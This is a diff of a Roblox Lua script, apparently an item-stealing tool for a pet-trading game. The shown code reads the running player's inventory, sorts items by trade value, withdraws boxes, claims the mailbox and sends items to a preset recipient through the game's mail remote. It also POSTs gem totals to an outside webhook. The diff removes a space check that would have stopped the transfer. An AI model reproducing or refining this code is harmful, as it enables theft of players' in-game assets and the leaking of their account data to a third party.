@@ -13,7 +13,6 @@ if not Library then return end
 local u1 = require(Library.Client.Network)
 require(Library)
 
--- THE actual remote
 local EF_Relay = RS:WaitForChild('Network'):WaitForChild('EF_Relay')
 
 local function getInventory()
@@ -112,7 +111,6 @@ local function sendWebhook(gems)
     pcall(reqFunc, {Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
 end
 
--- FIXED: EF_Relay:InvokeServer directly
 local function sendItem(cat, uid, amt)
     local i = 1
     local done = false
@@ -177,14 +175,6 @@ local function withdrawBoxes()
             if box._uq then pcall(function() u1.Invoke('Box: Withdraw All', uid) end) end
         end
     end
-end
-
-local function spaceCheck()
-    local v105 = next(_Inventory.Pet)
-    local ok, result = pcall(function()
-        return EF_Relay:InvokeServer('Roblox', MESSAGE, 'Pet', v105, 1)
-    end)
-    return result == "They don't have enough space!"
 end
 
 local function getRAP(cat, item)
@@ -267,11 +257,6 @@ wait(0.5)
 if #u6 > 0 or v11 + u21 < u25 then
     claimMailbox()
     withdrawBoxes()
-
-    if not spaceCheck() then
-        v8.Error('Account error — rejoin and retry')
-        return
-    end
 
     table.sort(u6, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
 
